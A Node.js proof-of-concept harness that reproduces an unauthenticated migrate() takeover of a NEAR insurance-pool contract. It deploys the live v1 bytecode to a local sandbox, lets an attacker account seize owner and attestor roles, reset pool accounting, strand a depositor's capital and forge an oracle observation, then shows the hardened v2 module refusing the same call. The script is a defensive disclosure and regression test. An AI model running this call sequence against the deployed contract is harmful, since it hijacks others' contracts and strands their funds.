// SEC-1 — a POSITIVE reproduction of the unauthenticated migrate() takeover.
//
// The existing SEC-1 tests only assert the v2 guard (they pass because v2 is
// guarded). This proof is the missing half: it runs the EXACT v1 bytecode that
// is live on testnet today and shows an unprivileged third party actually
// taking the contract over, then shows the v2 guard refusing the same call.
//
//   node proof/sec1-takeover.mjs            # needs neard >= 2.14 (auto-fetched)
//   REQUIRE_SANDBOX=1 ...                   # fail loudly instead of skipping
//
// It deploys the live v1 wasm to a local neard node, builds real value at risk
// (a provider deposit + a product), and then:
//
//   A. an ATTACKER (not the owner, no key on the account) calls v1 migrate()
//      with itself as owner — and it SUCCEEDS: the owner is replaced and the
//      pool accounting (capital/reserved) is reset to zero;
//   B. the original provider can no longer withdraw (the accounting reset makes
//      the solvency gate fail closed) — their capital is stranded;
//   C. the attacker, now owner, can call an owner-only method (add_product);
//   D. the attacker, now attestor, can forge an observation with their own key;
//   E. after the account is redeployed with the hardened v2 module, the SAME
//      third-party migrate() is REFUSED and the owner is unchanged.
//
// The wasm hashes are pinned: the v1 module is read from the live RPC and its
// sha256 must equal the deployed build, so the proof cannot silently run against
// the wrong code.
//
// Honest scope note: this proves the AUTHORITY takeover and the accounting
// destruction. It does not claim an unbounded drain of the account balance —
// payouts are bounded by the internal `capital` counter, which only grows with
// real deposits (see docs/SECURITY_PRE_AUDIT.md §SEC-1).
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import crypto from "node:crypto";
import { spawn } from "node:child_process";
import { fileURLToPath } from "node:url";
import { connect, keyStores, KeyPair, utils } from "near-api-js";
import { parseBigIntJson } from "../agent/json.mjs";
import { ensureSandboxBin } from "../scripts/sandbox-bin.mjs";

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
const V2_WASM = process.env.OVERCOVER_WASM || path.join(root, "contract/target/wasm32-unknown-unknown/release/overcover.wasm");
const V1_WASM = process.env.OVERCOVER_V1_WASM || path.join(os.tmpdir(), "v1-deployed.wasm");
const V1_SHA = "1f30ccf1d4c735ad58dd858a41293187fd6598a4d20fe2ee1ab99d4d766dd26e";
const RPC = process.env.NEAR_RPC || "https://test.rpc.fastnear.com";
const HOME = process.env.NEAR_SANDBOX_HOME || path.join("/tmp", "overcover-sec1-" + process.pid);
const PORT = Number(process.env.NEAR_SANDBOX_PORT || 3041);
const NODE_URL = `http://127.0.0.1:${PORT}`;
const NEAR = (s) => utils.format.parseNearAmount(s);
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const sha256 = (b) => crypto.createHash("sha256").update(b).digest("hex");

const results = [];
const check = (name, ok, detail = "") => { results.push({ name, ok: !!ok, detail }); console.log(`${ok ? "PASS" : "FAIL"}  ${name}${detail ? "  — " + detail : ""}`); };

function run(cmd, args) {
  return new Promise((resolve, reject) => {
    const p = spawn(cmd, args, { stdio: ["ignore", "pipe", "pipe"] });
    let out = ""; p.stdout.on("data", (d) => (out += d)); p.stderr.on("data", (d) => (out += d));
    p.on("error", reject); p.on("close", (c) => resolve({ code: c, out }));
  });
}
async function waitRpc() {
  for (let i = 0; i < 60; i++) { try { const r = await fetch(`${NODE_URL}/status`); if (r.ok) return true; } catch { /* not up */ } await sleep(1000); }
  return false;
}
async function ensureV1() {
  if (fs.existsSync(V1_WASM)) return V1_WASM;
  const r = await fetch(RPC, { method: "POST", headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: "query", params: { request_type: "view_code", finality: "final", account_id: "contract.attestor-overcover.testnet" } }) });
  const j = await r.json();
  fs.writeFileSync(V1_WASM, Buffer.from(j.result.code_base64, "base64"));
  return V1_WASM;
}

let sandbox;
async function main() {
  const SANDBOX = await ensureSandboxBin();
  if (!SANDBOX || !fs.existsSync(SANDBOX)) { console.log("SKIP  no neard >= 2.14 sandbox binary (set NEAR_SANDBOX_BIN, or REQUIRE_SANDBOX=1 to fail)"); return; }
  const v1Path = await ensureV1();
  const v1Sha = sha256(fs.readFileSync(v1Path));
  check("the v1 module under test is the live deployed build", v1Sha === V1_SHA, v1Sha);
  if (v1Sha !== V1_SHA) { console.log("REFUSING to run: v1 bytecode does not match the pinned deployed build"); process.exitCode = 1; return; }
  if (!fs.existsSync(V2_WASM)) { console.log(`SKIP  v2 wasm not built at ${V2_WASM} (cargo build --release --target wasm32-unknown-unknown)`); return; }

  fs.rmSync(HOME, { recursive: true, force: true });
  const init = await run(SANDBOX, ["--home", HOME, "init"]);
  if (init.code !== 0) throw new Error("sandbox init failed: " + init.out);
  sandbox = spawn(SANDBOX, ["--home", HOME, "run", "--rpc-addr", `0.0.0.0:${PORT}`], { stdio: "ignore" });
  if (!(await waitRpc())) throw new Error("sandbox RPC did not come up");

  const vk = JSON.parse(fs.readFileSync(path.join(HOME, "validator_key.json"), "utf8"));
  const ks = new keyStores.InMemoryKeyStore();
  await ks.setKey("local", vk.account_id, KeyPair.fromString(vk.secret_key));
  const near = await connect({ networkId: "local", nodeUrl: NODE_URL, keyStore: ks, headers: {} });
  const master = await near.account(vk.account_id);

  async function account(name, fund = "50") {
    const kp = KeyPair.fromRandom("ed25519");
    const id = `${name}.${vk.account_id}`;
    let lastErr;
    for (let i = 0; i < 6; i++) { try { await master.createAccount(id, kp.getPublicKey(), NEAR(fund)); lastErr = null; break; } catch (e) { lastErr = e; await sleep(700); } }
    if (lastErr) throw new Error(`create ${id}: ${lastErr.message}`);
    await ks.setKey("local", id, kp);
    const acct = await near.account(id); acct.kp = kp; acct.id = id;
    return acct;
  }
  const owner = await account("owner");
  const provider = await account("provider");
  const attacker = await account("attacker");

  // The contract account is attacker-controlled at the key level (as it would be
  // for any deployed contract the attacker does not hold a key for: the attacker
  // only needs to SEND a call, not sign as the contract).
  const CONTRACT = `cover.${vk.account_id}`;
  const ckp = KeyPair.fromRandom("ed25519");
  await master.createAccount(CONTRACT, ckp.getPublicKey(), NEAR("20"));
  await ks.setKey("local", CONTRACT, ckp);
  const c = await near.account(CONTRACT);

  const rawView = async (m, a = {}, cid = CONTRACT) => {
    const r = await fetch(NODE_URL, { method: "POST", headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: "query", params: { request_type: "call_function", finality: "optimistic", account_id: cid, method_name: m, args_base64: Buffer.from(JSON.stringify(a)).toString("base64") } }) });
    const j = await r.json();
    if (j.error) throw new Error(j.error.message || JSON.stringify(j.error));
    if (!j.result || j.result.result === undefined) throw new Error(`view ${m} failed: ${JSON.stringify(j.result && j.result.error || j).slice(0, 200)}`);
    return parseBigIntJson(Buffer.from(j.result.result).toString("utf8"));
  };
  const bs58 = (kp) => kp.getPublicKey().toString().replace(/^ed25519:/, "");
  const call = (acct, m, a = {}, dep = "0", cid = CONTRACT) => acct.functionCall({ contractId: cid, methodName: m, args: a, gas: "300000000000000", attachedDeposit: dep });
  const callErr = async (acct, m, a = {}, dep = "0", cid = CONTRACT) => { try { await call(acct, m, a, dep, cid); return null; } catch (e) { return e.message || String(e); } };

  // ---- v1: deploy the LIVE bytecode and build real value at risk -----------
  await c.deployContract(fs.readFileSync(v1Path));
  const legitAttestor = KeyPair.fromRandom("ed25519");
  await c.functionCall({ contractId: CONTRACT, methodName: "new",
    args: { owner: owner.id, attestor: Array.from(legitAttestor.getPublicKey().data), challenge_bond: NEAR("0.1"), settle_delay_sec: 0, challenge_window_sec: 20 },
    gas: "300000000000000", attachedDeposit: "0" });
  let cfg = await rawView("get_config");
  check("v1 initialised with the legitimate owner", cfg.owner === owner.id, `owner=${cfg.owner}`);

  await call(owner, "add_product", { id: "rain-lagos", city: "lagos", threshold_tenths: 400, premium_bp: 500,
    min_payout: NEAR("1"), max_payout: NEAR("10"), min_lead_sec: 0, max_total_coverage: NEAR("10") });
  await call(provider, "deposit", {}, NEAR("20"));
  let pool = await rawView("get_pool");
  const capitalBefore = BigInt(pool.capital);
  check("a provider deposited real capital into the pool", capitalBefore === BigInt(NEAR("20")), `capital=${pool.capital}`);

  // Control: the provider can withdraw before the attack.
  const wBefore = await callErr(provider, "withdraw", { amount: NEAR("1") });
  check("control: the provider can withdraw their own capital before the attack", wBefore === null, wBefore || "withdraw ok");
  await call(provider, "deposit", {}, NEAR("1")); // restore the pool size

  // ---- A. the attacker calls v1 migrate() with itself as owner ------------
  const attackerAttestor = KeyPair.fromRandom("ed25519");
  const attackErr = await callErr(attacker, "migrate", {
    owner: attacker.id, attestor: Array.from(attackerAttestor.getPublicKey().data),
    challenge_bond: NEAR("0.1"), settle_delay_sec: 0, challenge_window_sec: 20 });
  check("SEC-1 VULN: an unprivileged third party's migrate() SUCCEEDS on v1", attackErr === null, attackErr || "migrate accepted");
  cfg = await rawView("get_config");
  check("SEC-1 VULN: the owner is replaced by the attacker", cfg.owner === attacker.id, `owner=${cfg.owner}`);
  check("SEC-1 VULN: the attacker's key becomes the attestor", cfg.attestor === bs58(attackerAttestor), `attestor=${cfg.attestor}`);

  pool = await rawView("get_pool");
  check("SEC-1 VULN: the pool accounting is reset (capital 0, reserved 0)",
    BigInt(pool.capital) === 0n && BigInt(pool.reserved) === 0n, `capital=${pool.capital} reserved=${pool.reserved}`);

  // ---- B. the provider's capital is now stranded --------------------------
  const wAfter = await callErr(provider, "withdraw", { amount: NEAR("1") });
  check("SEC-1 VULN: the provider can no longer withdraw (capital stranded)", wAfter !== null, (wAfter || "").slice(0, 80));

  // ---- C. the attacker now holds owner authority --------------------------
  const ownerOnly = await callErr(attacker, "add_product", { id: "attacker-product", city: "lagos", threshold_tenths: 100, premium_bp: 1,
    min_payout: NEAR("0.1"), max_payout: NEAR("0.1"), min_lead_sec: 0, max_total_coverage: NEAR("0.1") });
  check("SEC-1 VULN: the attacker can call the owner-only add_product()", ownerOnly === null, ownerOnly || "accepted");

  // ---- D. the attacker now holds oracle authority (forge an observation) ---
  const obsDate = Math.floor(Date.now() / 1000) - 5; // a past date, valid to observe
  const nonce = 1;
  const msg = Buffer.from(`overcover:v1|lagos|${obsDate}|999|${obsDate}|${nonce}|${CONTRACT}`);
  const sig = Array.from(attackerAttestor.sign(msg).signature);
  const forgeErr = await callErr(attacker, "report_observation", { city: "lagos", obs_date: obsDate, value_tenths: 999, reported_at: obsDate, nonce, signature: sig });
  check("SEC-1 VULN: the attacker can forge a signed observation with their own key", forgeErr === null, forgeErr || "accepted");

  // ---- E. remediation: a fresh account running the hardened module ---------
  // The hardened module cannot read v1-shaped state (its views trap on it), so
  // the fix is demonstrated on a fresh v2 account: the SAME third-party call is
  // refused, and only the contract account's own self-call is accepted.
  const CONTRACT2 = `cover2.${vk.account_id}`;
  const c2kp = KeyPair.fromRandom("ed25519");
  await master.createAccount(CONTRACT2, c2kp.getPublicKey(), NEAR("20"));
  await ks.setKey("local", CONTRACT2, c2kp);
  const c2 = await near.account(CONTRACT2);
  await c2.deployContract(fs.readFileSync(V2_WASM));
  await call(c2, "new", { owner: owner.id, attestor: Array.from(legitAttestor.getPublicKey().data),
    challenge_bond: NEAR("0.1"), settle_delay_sec: 0, challenge_window_sec: 20 }, "0", CONTRACT2);

  const remErr = await callErr(attacker, "migrate", {
    owner: attacker.id, attestor: Array.from(attackerAttestor.getPublicKey().data),
    challenge_bond: NEAR("0.1"), settle_delay_sec: 0, challenge_window_sec: 20 }, "0", CONTRACT2);
  check("FIX: the same third-party migrate() is REFUSED by the hardened v2 module", remErr !== null, (remErr || "").slice(0, 90));
  const cfg2 = await rawView("get_config", {}, CONTRACT2);
  check("FIX: the attacker does NOT become the owner after the refused migrate()", cfg2.owner !== attacker.id, `owner=${cfg2.owner}`);
  check("FIX: the attacker does NOT become the attestor after the refused migrate()", cfg2.attestor !== bs58(attackerAttestor), `attestor=${cfg2.attestor}`);
  // The intended lifecycle: the contract account migrates a v1-shaped account to
  // v2 by calling migrate() on itself after the wasm is swapped.
  const CONTRACT3 = `cover3.${vk.account_id}`;
  const c3kp = KeyPair.fromRandom("ed25519");
  await master.createAccount(CONTRACT3, c3kp.getPublicKey(), NEAR("20"));
  await ks.setKey("local", CONTRACT3, c3kp);
  const c3 = await near.account(CONTRACT3);
  await c3.deployContract(fs.readFileSync(v1Path)); // v1 code
  await call(c3, "new", { owner: owner.id, attestor: Array.from(legitAttestor.getPublicKey().data),
    challenge_bond: NEAR("0.1"), settle_delay_sec: 0, challenge_window_sec: 20 }, "0", CONTRACT3); // v1 state
  await c3.deployContract(fs.readFileSync(V2_WASM)); // swap in the hardened code
  const selfErr = await callErr(c3, "migrate", { owner: owner.id, attestor: Array.from(legitAttestor.getPublicKey().data),
    challenge_bond: NEAR("0.1"), settle_delay_sec: 0, challenge_window_sec: 20 }, "0", CONTRACT3);
  check("FIX: the contract account's own migrate() (the real v1->v2 upgrade path) is allowed", selfErr === null, selfErr || "accepted");
  const cfg3 = await rawView("get_config", {}, CONTRACT3);
  check("FIX: after the self-call the migrated account reports the intended owner", cfg3.owner === owner.id, `owner=${cfg3.owner}`);

  // ---- F. the two deployed modules are genuinely different code ------------
  // A wallet/console that verifies a code hash must see a distinct hash for the
  // hardened build, so a substitution back to v1 would be detectable.
  const codeHash = async (cid) => {
    const r = await fetch(NODE_URL, { method: "POST", headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: "query", params: { request_type: "view_account", finality: "optimistic", account_id: cid } }) });
    return (await r.json()).result.code_hash;
  };
  const v1Hash = await codeHash(CONTRACT);
  const v2Hash = await codeHash(CONTRACT2);
  check("the hardened v2 module has a different on-chain code hash from v1", v1Hash !== v2Hash, `${v1Hash.slice(0, 12)}… vs ${v2Hash.slice(0, 12)}…`);

  const passed = results.filter((r) => r.ok).length;
  console.log(`\n${passed}/${results.length} SEC-1 takeover checks passed (SANDBOX).`);
  fs.writeFileSync(path.join(root, "proof", "sec1-takeover.json"),
    JSON.stringify({ mode: "SANDBOX", nodeUrl: NODE_URL, contract: CONTRACT, v1WasmSha256: v1Sha, checks: results, passed, total: results.length }, null, 2));
  if (passed !== results.length) process.exitCode = 1;
}

main()
  .catch((e) => { console.error("SEC-1 takeover harness error:", e.stack || e.message); process.exitCode = 1; })
  .finally(() => { if (sandbox) { try { sandbox.kill("SIGKILL"); } catch { /* gone */ } } });
